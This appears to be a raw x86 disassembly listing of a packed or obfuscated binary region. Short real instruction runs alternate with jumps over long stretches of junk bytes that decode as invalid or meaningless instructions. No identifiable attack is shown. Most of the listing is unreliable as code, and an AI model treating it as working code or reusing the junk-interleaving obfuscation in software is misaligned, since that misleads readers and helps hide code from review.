  4134b1:	icebp  
  4134b2:	jle    0x4134f7
  4134b4:	xchg   ebp,eax
  4134b5:	rol    DWORD PTR [esi+0x7e1fcb61],cl
  4134bb:	lea    esi,[edx-0x584b199d]
  4134c1:	(bad)  
  4134c2:	fsubr  DWORD PTR [esi]
  4134c4:	imul   eax,edi,0x9ef984a2
  4134ca:	add    al,0xd4
  4134cc:	push   esi
  4134cd:	dec    esi
  4134ce:	loopne 0x413532
  4134d0:	add    al,0x6c
  4134d2:	and    al,ah
  4134d4:	(bad)  
  4134d5:	jae    0x4134aa
  4134d7:	jmp    0x9287:0xaf36ac95
  4134de:	sbb    DWORD PTR [edi],ebp
  4134e0:	dec    ecx
  4134e1:	mov    edx,0xfabd1de5
  4134e6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4134e8:	cmc    
  4134e9:	imul   esp,DWORD PTR [ecx+0x46],0x6d
  4134ed:	dec    ebx
  4134ee:	(bad)  
  4134ef:	ins    BYTE PTR es:[edi],dx
  4134f0:	fisubr DWORD PTR ds:[eax+0x7fab9e2d]
  4134f7:	jo     0x41347b
  4134f9:	or     eax,0xf3b52657
  4134fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ff:	mov    dl,0x62
  413501:	inc    ecx
  413502:	sbb    esp,eax
  413504:	js     0x413491
  413506:	pop    esi
  413507:	xchg   ebp,eax
  413508:	push   ebx
  413509:	push   0xe9fdad5d
  41350e:	pop    edi
  41350f:	cmp    eax,0xb6d7b426
  413514:	or     BYTE PTR [eax+eiz*8+0x60cca752],cl
  41351b:	sti    
  41351c:	mov    esi,0xa7abf3
  413521:	pop    edi
  413522:	icebp  
  413523:	mov    eax,ds:0x54c00af9
  413528:	push   ecx
  413529:	add    BYTE PTR [eax+0x403dc2fe],cl
  41352f:	pop    eax
  413530:	sahf   
  413531:	ficomp WORD PTR [ebp+0x1a]
  413534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413535:	(bad)  
  413536:	jle    0x413546
  413538:	xor    eax,0xe79882a3
  41353d:	jl     0x413552
  41353f:	ret    0xc7f7
  413542:	adc    dh,BYTE PTR [ebp-0x7a80a499]
  413548:	test   BYTE PTR [ecx],ch
  41354a:	sti    
  41354b:	xchg   ebx,eax
  41354c:	sub    BYTE PTR [esi],al
  41354e:	pop    edi
  41354f:	mov    al,0xf7
  413551:	mov    dh,0x2d
  413553:	push   cs
  413554:	fwait
  413555:	xchg   esi,eax
  413556:	scas   eax,DWORD PTR es:[edi]
  413557:	adc    BYTE PTR [edx],dh
  413559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41355a:	push   edx
  41355b:	repz pusha 
  41355d:	push   eax
  41355e:	mov    dh,0x60
  413560:	mov    ebp,0x1904d90e
  413565:	inc    ecx
  413566:	and    DWORD PTR ss:[ecx],0x94500a06
  41356d:	sbb    eax,0xab89edbf
  413572:	jg     0x413517
  413574:	mov    esi,0xfdfaba06
  413579:	pop    es
  41357a:	es push eax
  41357c:	lods   eax,DWORD PTR ds:[esi]
  41357d:	mov    ecx,0x9a777751
  413582:	popf   
  413583:	sub    eax,0x833843e8
  413588:	rol    BYTE PTR [ecx+esi*8+0x654bb374],0x2
  413590:	into   
  413591:	shl    BYTE PTR [ecx],cl
  413593:	or     eax,0x384426d1
  413598:	pop    ecx
  413599:	inc    esp
  41359a:	popf   
  41359b:	inc    esp
  41359c:	mov    esi,0x72c072a8
  4135a1:	int    0x24
  4135a3:	mov    ecx,0x532adc7b
  4135a8:	cmp    BYTE PTR [edx],bh
  4135aa:	out    dx,eax
  4135ab:	(bad)  
  4135ac:	cmp    al,0x19
  4135ae:	or     BYTE PTR [esi-0x33],bl
  4135b1:	dec    esi
  4135b2:	pop    ecx
  4135b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135b4:	call   0xa595f58f
  4135b9:	pop    ss
  4135ba:	adc    esi,DWORD PTR [esi+0x7646be07]
  4135c0:	aaa    
  4135c1:	stos   DWORD PTR es:[edi],eax
  4135c2:	ins    DWORD PTR es:[edi],dx
  4135c3:	cs mov ebx,0x757c0cce
  4135c9:	fstp   QWORD PTR [edi+0x6e35d47]
  4135cf:	lock outs dx,DWORD PTR ds:[esi]
  4135d1:	jns    0x4135c8
  4135d3:	dec    eax
  4135d4:	xchg   edi,eax
  4135d5:	mov    ds:0x9f679c2b,eax
  4135da:	cmp    DWORD PTR [edi+esi*8],edx
  4135dd:	fist   WORD PTR [ecx-0x61]
  4135e0:	xor    bl,BYTE PTR [esi-0x6b]
  4135e3:	call   0x30cd34f9
  4135e8:	test   al,0xf
  4135ea:	xchg   esi,eax
  4135eb:	or     BYTE PTR [ecx],dl
  4135ed:	jp     0x41359d
  4135ef:	xor    eax,0xecf015de
  4135f4:	fmul   QWORD PTR [ebx+ecx*4+0x72]
  4135f8:	aam    0x8
  4135fa:	iret   
  4135fb:	xchg   DWORD PTR [edi+0x7],ebp
  4135fe:	sbb    DWORD PTR [eax+0x6d8e59f3],ebx
  413604:	sub    ebx,DWORD PTR [eax-0x7f2061ec]
  41360a:	jmp    0xf99:0x722751f7
  413611:	xchg   ebx,eax
  413612:	leave  
  413613:	call   0x43c161c3
  413618:	and    bl,BYTE PTR [esi*1+0x1dec2a01]
  41361f:	pop    ebx
  413620:	mov    bh,0x82
  413623:	lock sub DWORD PTR [edx],esp
  413626:	aad    0xb0
  413628:	push   esp
  413629:	mov    ds:0x4bc764d7,al
  41362e:	jmp    DWORD PTR [ebx-0x3f]
  413631:	inc    ebx
  413632:	mov    ebp,0xa775fe18
  413637:	aad    0x68
  413639:	mov    ah,0x9e
  41363b:	int    0x28
  41363d:	int3   
  41363e:	mov    bh,0x73
  413640:	ret    
  413641:	dec    ecx
  413642:	xchg   ebx,eax
  413643:	xchg   edx,eax
  413644:	in     eax,dx
  413645:	fstp   TBYTE PTR [ebp+0x7d]
  413648:	push   esi
  413649:	push   eax
  41364a:	sub    al,0xf4
  41364c:	mov    eax,DWORD PTR [eax+0xf369d44]
  413652:	and    bh,cl
  413654:	mov    esp,0x1ee959ab
  413659:	fisubr DWORD PTR [ebx+0x3edd7bdf]
  41365f:	dec    esp
  413660:	call   0xeead4ef5
  413665:	sbb    DWORD PTR [edx],esi
  413667:	(bad)  
  413668:	jae    0x413611
  41366a:	mov    ebp,0xb8094bdd
  41366f:	jl     0x4136e4
  413671:	rep stos BYTE PTR es:[edi],al
  413673:	mov    bh,BYTE PTR [esi+0x5b]
  413676:	push   edx
  413677:	jl     0x4136d3
  413679:	lahf   
  41367a:	inc    esp
  41367b:	jnp    0x41366b
  41367d:	push   edi
  41367e:	jmp    0x71fa5314
  413683:	sub    eax,0x6bdf8307
  413688:	sub    bl,bh
  41368a:	clc    
  41368b:	fs cmp esi,eax
  41368e:	mov    cl,0xf0
  413690:	call   0xe74c75ec
  413695:	ficomp WORD PTR [edi+eax*8+0x9582077]
  41369c:	(bad)  
  41369e:	xchg   BYTE PTR [edi+eax*4],ch
  4136a1:	push   0xffffffa2
  4136a3:	arpl   si,bp
  4136a5:	pop    edx
  4136a6:	inc    ebp
  4136a7:	data16 jns 0x413723
  4136aa:	lds    ebx,FWORD PTR [ebp-0x35053b17]
  4136b0:	repnz pop ecx
  4136b2:	mov    ds:0x2dc47ff6,eax
  4136b7:	jmp    0xa3ca:0x81020cf9
  4136be:	cmp    eax,0x45783c9a
  4136c3:	sbb    edi,DWORD PTR [edx]
  4136c5:	and    eax,0xe569c751
  4136ca:	adc    ah,BYTE PTR [edx+0x1250a7a2]
  4136d0:	lea    edi,[ebx]
  4136d2:	dec    edx
  4136d3:	mov    edx,DWORD PTR [ebp-0x44]
  4136d6:	mov    edi,DWORD PTR [ebp-0xc]
  4136d9:	xor    edx,eax
  4136db:	xor    edi,eax
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp+0x1c597219]
  4136f4:	out    dx,eax
  4136f5:	adc    ebp,DWORD PTR [eax]
  4136f7:	jge    0x413778
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x413692
  4136ff:	push   cs
  413700:	lods   al,BYTE PTR ds:[esi]
  413701:	fdivr  QWORD PTR [ebx+ebp*4]
  413704:	aad    0x59
  413706:	xchg   ah,dl
  413708:	pusha  
  413709:	jno    0x413712
  41370b:	sub    al,0x92
  41370d:	imul   ebp,DWORD PTR [eax-0x23aafa0c],0xffffffb9
  413714:	loop   0x41371f
  413716:	cmp    ah,0xec
  413719:	cwde   
  41371a:	push   ss
  41371b:	mov    esi,0xb9749ef9
  413720:	sbb    al,0xf8
  413722:	pop    eax
  413723:	repz sub edx,DWORD PTR [esp+eiz*8-0x5d4e9b70]
  41372b:	ret    
  41372c:	jb     0x413797
  41372e:	loope  0x413757
  413730:	lods   eax,DWORD PTR ds:[esi]
  413731:	mov    DWORD PTR [eax],esp
  413733:	adc    BYTE PTR [ecx-0x2937d41e],al
  413739:	imul   ebp,DWORD PTR [edx],0x71
  41373c:	ret    
  41373d:	aaa    
  41373e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41373f:	add    BYTE PTR [eax-0xaabdd02],al
  413745:	loope  0x4136d4
  413747:	out    0x68,eax
  413749:	xor    ch,BYTE PTR [esi-0x7210a4cf]
  41374f:	aad    0x60
  413751:	ja     0x4137c6
  413753:	xchg   ebx,eax
  413754:	popa   
  413755:	retf   
  413756:	xchg   esi,ebx
  413758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413759:	inc    esi
  41375a:	imul   eax,DWORD PTR [esi],0xe481e44e
  413760:	inc    eax
  413761:	xor    BYTE PTR ds:[ebx-0x7a],dh
  413765:	fldenv [ecx+0x1fd6d350]
  41376b:	adc    al,0x5f
  41376d:	lods   eax,DWORD PTR ds:[esi]
  41376e:	mov    WORD PTR [ebx-0x2f9c7cfc],es
  413774:	stos   DWORD PTR es:[edi],eax
  413775:	in     eax,dx
  413776:	dec    edi
  413777:	aas    
  413778:	adc    DWORD PTR [edi+0x33f7183f],0x2a
  41377f:	jle    0x413705
  413781:	lock mov al,0xea
  413784:	pushf  
  413785:	or     DWORD PTR [ebx],esp
  413787:	fisub  WORD PTR [edx+edx*1-0x17]
  41378b:	pop    esi
  41378c:	loope  0x413744
  41378e:	jmp    FWORD PTR [ecx]
  413790:	jno    0x41373b
  413792:	adc    ah,BYTE PTR [ebp+0x40]
  413795:	dec    ecx
  413796:	cmc    
  413797:	aad    0x6a
  413799:	push   cs
  41379a:	adc    al,0x8e
  41379c:	bound  esp,QWORD PTR ds:0x2950ff09
  4137a2:	dec    ebx
  4137a3:	inc    eax
  4137a4:	(bad)  
  4137a5:	fs jne 0x4137de
  4137a8:	adc    al,0xe3
  4137aa:	mov    al,ds:0xc33deb62
  4137af:	rol    DWORD PTR [edi+ebx*2],cl
  4137b2:	mul    BYTE PTR [esi-0x7bb7ae69]
  4137b8:	call   0x27515c32
  4137bd:	inc    edx
  4137be:	out    dx,eax
  4137bf:	adc    al,0xe1
  4137c1:	adc    ebx,DWORD PTR [ebp-0xb8f185c]
  4137c7:	push   0x20
  4137c9:	scas   al,BYTE PTR es:[edi]
  4137ca:	cs lock mov bh,0x26
  4137ce:	(bad)  
  4137cf:	ins    DWORD PTR es:[edi],dx
  4137d0:	f2xm1  
  4137d2:	out    0x11,eax
  4137d4:	ja     0x4137c7
  4137d6:	ins    DWORD PTR es:[edi],dx
  4137d7:	xchg   DWORD PTR [edi+esi*4],edi
  4137da:	rcl    dl,0x8
  4137dd:	or     ebx,DWORD PTR [ebp+0x5d9fa695]
  4137e3:	lock sar BYTE PTR [eax-0x7a],0xce
  4137e8:	add    ah,cl
  4137ea:	lahf   
  4137eb:	jae    0x413857
  4137ed:	xlat   BYTE PTR ds:[ebx]
  4137ee:	scas   al,BYTE PTR es:[edi]
  4137ef:	pop    edx
  4137f0:	cdq    
  4137f1:	lods   eax,DWORD PTR ds:[esi]
  4137f2:	pusha  
  4137f3:	xor    al,0x8e
  4137f5:	in     eax,0xe6
  4137f7:	jno    0x4137ab
  4137f9:	out    0x5e,eax
  4137fb:	adc    ebp,DWORD PTR [edx]
  4137fd:	adc    BYTE PTR [ebx+esi*8],dh
  413800:	pop    ebx
  413801:	loope  0x41387f
  413803:	fcom   QWORD PTR [edx]
  413805:	dec    eax
  413806:	xchg   ecx,eax
  413807:	dec    ecx
  413808:	push   ebp
  413809:	dec    edx
  41380a:	ror    DWORD PTR [ebp+ecx*8-0x12],0xb1
  41380f:	inc    ebx
  413810:	pop    ebx
  413811:	int3   
  413812:	retf   0xa1c3
  413815:	nop
  413816:	out    0xae,al
  413818:	adc    ax,0x38c3
  41381c:	(bad)  
  41381d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41381e:	ja     0x413890
  413820:	jo     0x4137f8
  413822:	fmulp  st(1),st
  413824:	lea    edx,[edi-0x1e]
  413827:	mov    ebx,0x8c1c7245
  41382c:	outs   dx,BYTE PTR ds:[esi]
  41382d:	jge    0x41382e
  41382f:	data16 xor BYTE PTR [ecx],cl
  413832:	test   ebx,ebx
  413834:	popa   
  413835:	adc    cl,BYTE PTR [ecx]
  413837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413838:	push   es
  413839:	ret    
  41383a:	and    DWORD PTR [ecx],eax
  41383c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41383d:	hlt    
  41383e:	sub    DWORD PTR [edx-0x42f7fbe8],edi
  413844:	out    dx,eax
  413845:	fist   DWORD PTR [eax]
  413847:	imul   eax,DWORD PTR [ebx+0x6b],0x9f38d3a
  41384e:	clc    
  41384f:	pop    ds
  413850:	iret   
  413851:	cwde   
  413852:	mov    esi,DWORD PTR [edi+0x41]
  413855:	jmp    0x4137f4
  413857:	not    BYTE PTR [ebx]
  413859:	addr16 xchg ebp,eax
  41385b:	call   0x307b:0x1228b099
  413862:	popa   
  413863:	mov    bh,0x47
  413865:	loopne 0x413858
  413867:	test   al,0xac
  413869:	mov    bl,0xd4
  41386b:	jmp    0x838b:0x29904a5c
  413872:	mov    esi,cs
  413874:	sbb    eax,0xb635b8d6
  413879:	pop    ss
  41387a:	xchg   edx,eax
  41387b:	adc    BYTE PTR [edi+0x1a],dl
  41387e:	test   al,0xde
  413880:	pop    ebp
  413881:	xor    al,0x81
  413883:	cmc    
  413884:	retf   0xa8ef
  413887:	mov    dl,ch
  413889:	test   eax,0x11141303
  41388e:	jns    0x4138db
  413890:	sti    
  413891:	jge    0x4138b5
  413893:	shl    al,cl
  413895:	(bad)  
  413896:	fcom   QWORD PTR [esp+ecx*1-0x6c5ed262]
  41389d:	imul   ebp,DWORD PTR [esi-0x47],0xffffff9a
  4138a1:	cmp    esi,DWORD PTR [edx+0x72]
  4138a4:	mov    ch,0x7e
  4138a6:	imul   edx,DWORD PTR [edi-0x47],0x3d46abae
  4138ad:	mov    esp,DWORD PTR [edi+ecx*1]
  4138b0:	cs gs inc ebx
  4138b3:	ins    BYTE PTR es:[edi],dx
  4138b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138b5:	int3   
  4138b6:	outs   dx,BYTE PTR ds:[esi]
  4138b7:	ins    DWORD PTR es:[edi],dx
  4138b8:	jb     0x4138c3
  4138ba:	mov    ch,0xa1
  4138bc:	push   edi
  4138bd:	(bad)
  4138c0:	sahf   
  4138c1:	ins    BYTE PTR es:[edi],dx
  4138c2:	sbb    BYTE PTR [ecx+0x58969f64],bh
  4138c8:	jbe    0x413856
  4138ca:	cmp    BYTE PTR [ecx],al
  4138cc:	push   ds
  4138cd:	fld    st(7)
  4138cf:	nop
  4138d0:	in     al,dx
  4138d1:	xor    ebp,ebx
  4138d3:	pop    esi
  4138d4:	into   
  4138d5:	dec    ebp
  4138d6:	daa    
  4138d7:	push   ebx
  4138d8:	in     eax,dx
  4138d9:	jmp    0xeca76cc7
  4138de:	cmp    edx,DWORD PTR [esi+0x42]
  4138e1:	pop    ebx
  4138e2:	sub    BYTE PTR [edx-0x55],dl
  4138e5:	or     al,0x35
  4138e7:	cmp    al,BYTE PTR [edi-0x1c]
  4138ea:	jbe    0x413925
  4138ec:	inc    ecx
  4138ed:	cmp    al,0xa
  4138ef:	enter  0xf961,0xe2
  4138f3:	fisubr DWORD PTR [edi-0x39]
  4138f6:	jno    0x4138fc
  4138f8:	in     eax,dx
  4138f9:	jbe    0x413932
  4138fb:	stos   DWORD PTR es:[edi],eax
  4138fc:	(bad)  
  4138fd:	lock mov ebp,0xd8c06b
  413903:	pusha  
  413904:	leave  
  413905:	add    eax,0x3284bd01
  41390a:	enter  0x408d,0x46
  41390e:	bound  edi,QWORD PTR [ebx+0x372b034]
  413914:	popf   
  413915:	xor    DWORD PTR [ecx],edx
  413917:	mov    ebx,0x4d190e6b
  41391c:	add    edx,DWORD PTR [edx+0x48]
  41391f:	aad    0x7b
  413921:	lods   eax,DWORD PTR ds:[esi]
  413922:	aaa    
  413923:	pop    es
  413924:	loope  0x41397c
  413926:	shl    DWORD PTR ds:[edx],1
  413929:	enter  0xffeb,0x86
  41392d:	sbb    ebx,DWORD PTR ds:0xc0b63dc3
  413933:	cdq    
  413934:	mov    al,ds:0x31619241
  413939:	jno    0x4138c5
  41393b:	sub    DWORD PTR [edx+0x4],0x607ab0d4
  413942:	loopne 0x41394a
  413944:	or     al,0x7a
  413946:	ds (bad) 
  413948:	pushf  
  413949:	jg     0x41398c
  41394b:	leave  
  41394c:	mov    al,ds:0xa8787a27
  413951:	ss in  eax,0xe6
  413954:	arpl   WORD PTR [esi-0x13],si
  413957:	call   0x1c2b:0x29433d32
  41395e:	jmp    ecx
  413960:	loopne 0x41399c
  413962:	mov    dh,0xcb
  413965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413966:	ja     0xd7f0490c
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x41392f
  413996:	xchg   edx,eax
  413997:	retf   0x954c
  41399a:	add    edi,DWORD PTR [edi+0x78]
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	xchg   esi,eax
  4139a2:	mov    DWORD PTR [ecx+ebx*4-0x5a3a1889],esp
  4139a9:	push   eax
  4139aa:	jmp    0xcf0:0x75f20eb1
  4139b1:	mov    ?,esp
  4139b3:	jl     0x4139cd
  4139b5:	(bad)  
  4139b6:	stos   BYTE PTR es:[edi],al
  4139b7:	cli    
  4139b8:	push   edx
  4139b9:	jnp    0x41398e
  4139bb:	mov    al,ds:0xe01ce1ef
  4139c0:	daa    
  4139c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139c2:	sub    ch,BYTE PTR fs:[edx]
  4139c5:	cwde   
  4139c6:	xchg   BYTE PTR [ecx+0x4d],ah
  4139c9:	push   ecx
  4139ca:	jbe    0x413951
  4139cc:	shl    cl,cl
  4139ce:	mov    bl,0x64
  4139d0:	pop    ss
  4139d1:	push   0x74
  4139d3:	lds    esp,FWORD PTR [edx-0x57]
  4139d6:	adc    bl,0x83
  4139d9:	lods   eax,DWORD PTR ds:[esi]
  4139da:	fsub   st,st(1)
  4139dc:	pop    edi
  4139dd:	test   BYTE PTR [esi-0x4b856c81],dh
  4139e3:	mov    esp,0x268ddf76
  4139e8:	call   0x667aab17
  4139ed:	adc    eax,0x80cbca1b
  4139f2:	sahf   
  4139f3:	out    dx,al
  4139f4:	mov    esi,0x9217717a
  4139f9:	or     dh,BYTE PTR [ebp+0x120dda89]
  4139ff:	and    DWORD PTR [edx+0x56],ebp
  413a02:	sub    BYTE PTR [edx+0x71f71dac],bl
  413a08:	jl     0x4139f2
  413a0a:	xchg   edi,eax
  413a0b:	lock jae 0x413a3c
  413a0e:	std    
  413a0f:	cmc    
  413a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a11:	or     BYTE PTR [esi-0x41],al
  413a14:	test   DWORD PTR [ebx+0x609d94d4],ebx
  413a1a:	and    DWORD PTR [ebx+0x21dedd51],esp
  413a20:	lock inc esi
  413a22:	popa   
  413a23:	xchg   esp,eax
  413a24:	(bad)  
  413a25:	mov    dh,0x34
  413a27:	push   edx
  413a28:	xchg   ebx,eax
  413a29:	or     esp,DWORD PTR [edx+0x28829c7b]
  413a2f:	ficomp WORD PTR [ebp-0x58a4d6d7]
  413a35:	jne    0x413aa2
  413a37:	or     cl,al
  413a39:	inc    edx
  413a3a:	sbb    ebx,eax
  413a3c:	(bad)  
  413a3d:	hlt    
  413a3e:	mov    edx,0xc1080a55
  413a43:	sub    BYTE PTR [ebx],cl
  413a45:	inc    edi
  413a46:	push   edx
  413a47:	mov    ah,0x8b
  413a49:	dec    edi
  413a4a:	aad    0xcc
  413a4c:	imul   edx,DWORD PTR [ebp+0x35],0x37
  413a50:	xor    edx,ebp
  413a52:	rol    DWORD PTR [ebx+0x27],1
  413a55:	out    dx,eax
  413a56:	retf   0xc2a4
  413a59:	sub    DWORD PTR [edi+0x1c],eax
  413a5c:	int    0x91
  413a5e:	(bad)  
  413a60:	and    esp,DWORD PTR [esi-0x109aa279]
  413a66:	xor    BYTE PTR es:[ecx+ecx*8-0x5f881f6],bl
  413a6e:	fs mov ch,0x66
  413a71:	pop    ebx
  413a72:	pop    esi
  413a73:	rcr    BYTE PTR [esi+0x24],cl
  413a76:	push   esp
  413a77:	into   
  413a78:	lds    edx,FWORD PTR [edx+0x2646bfc9]
  413a7e:	push   eax
  413a7f:	loop   0x413aad
  413a81:	sbb    eax,0xa6be0190
  413a86:	mov    dh,BYTE PTR [ebp+0x56]
  413a89:	fisub  WORD PTR [eax]
  413a8b:	icebp  
  413a8c:	(bad)  
  413a8d:	fidiv  DWORD PTR [edx+eax*2]
  413a90:	shl    DWORD PTR [ebx-0x6],0xf4
  413a94:	push   es
  413a95:	int3   
  413a96:	scas   al,BYTE PTR es:[edi]
  413a97:	sbb    BYTE PTR [edi],0xf4
  413a9a:	inc    esi
  413a9b:	cmp    DWORD PTR ds:0x3fc49b17,edx
  413aa1:	add    DWORD PTR [ebx],eax
  413aa3:	dec    edi
  413aa4:	mov    ch,BYTE PTR [edi+eax*8]
  413aa7:	sbb    al,0xd1
  413aa9:	and    cl,BYTE PTR [esi+esi*8-0x4f]
  413aad:	cmp    al,0x98
  413aaf:	xor    al,0x28
  413ab1:	push   esp
  413ab2:	pop    eax
  413ab3:	call   0x6d075fb4
  413ab8:	dec    edi
  413ab9:	test   eax,0x2f332ffa
  413abe:	cmp    eax,0x8ec8d173
  413ac3:	dec    edx
  413ac4:	mov    esi,0xe26c5f2
  413ac9:	(bad)  
  413aca:	xor    eax,0xe48ed2c3
  413acf:	mov    DWORD PTR [ebx],eax
  413ad1:	push   ebx
  413ad2:	sahf   
  413ad3:	or     bl,BYTE PTR [edx]
  413ad5:	das    
  413ad6:	push   ds
  413ad7:	add    ecx,ebx
  413ad9:	pop    esi
  413ada:	jns    0x413a80
  413adc:	pop    esp
  413add:	dec    edx
  413ade:	stos   DWORD PTR es:[edi],eax
  413adf:	out    dx,al
  413ae0:	pop    ebx
  413ae1:	xchg   edx,eax
  413ae2:	lea    ebx,[edi-0x33]
  413ae5:	and    ah,BYTE PTR [eax-0x35]
  413ae8:	mov    cl,0xda
  413aea:	inc    ebp
  413aeb:	inc    esi
  413aec:	fiadd  WORD PTR [eax+0x27]
  413aef:	mov    ah,BYTE PTR [ecx]
  413af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413af2:	call   0x4567964
  413af7:	stos   DWORD PTR es:[edi],eax
  413af8:	lea    eax,[ecx]
  413afa:	out    0x98,eax
  413afc:	jb     0x413b23
  413afe:	call   FWORD PTR [ebx]
  413b00:	or     al,0x83
  413b02:	ror    ebp,cl
  413b04:	pop    ss
  413b05:	pushf  
  413b06:	dec    esp
  413b07:	sbb    eax,0x77a10b83
  413b0c:	push   ss
  413b0d:	sub    ch,ah
  413b0f:	xchg   BYTE PTR [ebp-0x3d],al
  413b12:	cmp    eax,0x1419c40d
  413b17:	(bad)  
  413b18:	cwde   
  413b19:	or     al,0x8
  413b1b:	pushf  
  413b1c:	mov    al,0xe3
  413b1e:	arpl   WORD PTR [edx-0x2e],sp
  413b21:	pop    ss
  413b22:	ret    0xeb22
  413b25:	mov    bh,0x58
  413b27:	or     al,0x55
  413b29:	pop    ecx
  413b2a:	jb     0x413b31
  413b2c:	adc    BYTE PTR [edi-0x5d],dh
  413b2f:	pusha  
  413b30:	(bad)  
  413b31:	in     eax,0x9b
  413b33:	mov    al,ds:0xf683e7d2
  413b38:	cwde   
  413b39:	xor    eax,edx
  413b3b:	cs or  ah,ch
  413b3e:	sti    
  413b3f:	sar    BYTE PTR [ebp+0x49],cl
  413b42:	mov    ecx,0x30f29029
  413b47:	outs   dx,BYTE PTR ds:[esi]
  413b48:	out    0x9f,eax
  413b4a:	cwde   
  413b4b:	not    DWORD PTR [ebx-0x7f]
  413b4e:	mov    ah,0xe2
  413b50:	push   cs
  413b51:	push   ds
  413b52:	sbb    DWORD PTR [edx],esi
  413b54:	adc    DWORD PTR [ecx+0x1462cf20],ebx
  413b5a:	hlt    
  413b5b:	popf   
  413b5c:	retf   
  413b5d:	test   DWORD PTR [ebx+0x7f],ebp
  413b60:	loopne 0x413b2b
  413b62:	and    DWORD PTR [edi],0xffffffff
  413b65:	inc    edx
  413b66:	cmp    ebp,DWORD PTR [eax]
  413b68:	mov    ?,eax
  413b6a:	das    
  413b6b:	mov    esi,0xb49afc5e
  413b70:	bound  ecx,QWORD PTR [ebx]
  413b72:	and    ebx,DWORD PTR [esi-0x777bcd8f]
  413b78:	and    eax,0x7dbdb60b
  413b7d:	fbld   TBYTE PTR [ecx-0x3a]
  413b80:	shr    BYTE PTR ds:[edx+ecx*1],1
  413b84:	xor    eax,0x72f4a10b
  413b89:	push   edi
  413b8a:	and    BYTE PTR [esi+0x73b84b9b],ah
  413b90:	dec    ecx
  413b91:	sub    cl,ah
  413b93:	(bad)  
  413b94:	mov    eax,ds:0x1abc5da9
  413b99:	jg     0x413ba0
  413b9b:	push   ds
  413b9c:	adc    edi,DWORD PTR [ebp+0x1]
  413b9f:	sbb    eax,0xe701c676
  413ba4:	outs   dx,BYTE PTR ds:[esi]
  413ba5:	xchg   ebp,eax
  413ba6:	in     eax,0xec
  413ba8:	mov    esp,0x7162ab72
  413bad:	jge    0x413b68
  413baf:	imul   eax,DWORD PTR [esi-0x497808d1],0x8ace8e18
  413bb9:	jge    0x413b77
  413bbb:	cmp    ecx,DWORD PTR [ebx]
  413bbd:	cmp    ah,0x5c
  413bc0:	call   0x5375:0xdcadebd
  413bc7:	push   0x7de440ec
  413bcc:	cmpxchg BYTE PTR [ebx],dh
  413bcf:	fnstenv [ecx+0x747517f7]
  413bd5:	sbb    eax,0x5bd3ff16
  413bda:	adc    DWORD PTR [eax-0x57],esp
  413bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bde:	fcmovnu st,st(6)
  413be0:	mov    ebp,0x1c07a991
  413be5:	mov    bh,0x52
  413be7:	xchg   ebp,eax
  413be8:	(bad)  
  413bea:	sar    DWORD PTR [edi],cl
  413bec:	xor    DWORD PTR [ecx],eax
  413bee:	xchg   esp,eax
  413bef:	(bad)  
  413bf0:	cmp    DWORD PTR [eax],eax
  413bf2:	stos   DWORD PTR es:[edi],eax
  413bf3:	jnp    0x413c52
  413bf5:	stos   DWORD PTR es:[edi],eax
  413bf6:	add    BYTE PTR [eax],bh
  413bf8:	mov    ebx,gs
  413bfa:	jmp    0x5aaa3dd7
  413bff:	call   FWORD PTR [ecx]
  413c01:	call   0x1f4b7f3c
  413c06:	mov    ds:0xb1998a66,eax
  413c0b:	xor    ch,BYTE PTR [ebx]
  413c0d:	xlat   BYTE PTR ds:[ebx]
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	scas   eax,DWORD PTR es:[edi]
  413c2a:	jno    0x413c92
  413c2c:	lods   al,BYTE PTR ds:[esi]
  413c2d:	add    al,BYTE PTR [eax]
  413c2f:	jg     0x413ca9
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	stos   BYTE PTR es:[edi],al
  413c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c37:	inc    edx
  413c38:	push   ebp
  413c39:	mov    edi,0x5afb528c
  413c3e:	stc    
  413c3f:	adc    DWORD PTR [esi],esp
  413c41:	iret   
  413c42:	sbb    ah,BYTE PTR ds:0x6b6f4792
  413c48:	hlt    
  413c49:	xor    bh,0x2e
  413c4c:	xchg   edi,eax
  413c4d:	out    dx,al
